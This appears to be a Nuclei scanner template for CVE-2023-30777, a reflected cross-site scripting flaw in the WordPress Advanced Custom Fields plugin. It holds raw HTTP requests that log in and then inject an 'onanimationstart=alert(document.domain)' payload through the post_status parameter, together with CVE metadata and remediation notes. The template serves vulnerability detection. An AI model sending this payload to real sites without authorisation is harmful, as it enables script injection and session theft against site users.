http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(content_type_2, "text/html")
    - contains(body_2, "onanimationstart=alert(document.domain)//")
    - contains(body_2, "Advanced Custom Fields")
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/edit.php?post_type=acf-post-type&post_status=%22style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29%2F%2F
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-30777
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:advancedcustomfields:advanced_custom_fields:*:*:*:*:-:wordpress:*:*
    cve-id: CVE-2023-30777
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.64351
    epss-score: 0.00269
  description: 'Advanced Custom Fields beofre 6.1.6 is susceptible to cross-site scripting
    via the post_status parameter due to insufficient input sanitization and output
    escaping. An attacker can inject arbitrary script in the browser of an unsuspecting
    user in the context of the affected site. This can allow the attacker to steal
    cookie-based authentication credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of a victim''s browser, potentially leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: advanced_custom_fields
    vendor: advancedcustomfields
    verified: true
  name: Advanced Custom Fields < 6.1.6 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/95ded80f-a47b-411e-bd17-050439bf565f
  - https://wordpress.org/plugins/advanced-custom-fields/advanced/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-30777
  - https://patchstack.com/database/vulnerability/advanced-custom-fields-pro/wordpress-advanced-custom-fields-pro-plugin-6-1-5-reflected-cross-site-scripting-xss-vulnerability?_s_id=cve
  - https://patchstack.com/database/vulnerability/advanced-custom-fields/wordpress-advanced-custom-fields-plugin-6-1-5-reflected-cross-site-scripting-xss-vulnerability?_s_id=cve
  remediation: Fixed in version 6.1.6.
  severity: medium
  tags: cve2023,cve,wpscan,advance-custom-field,wp,wp-plugin,wordpress,authenticated,xss,advancedcustomfields
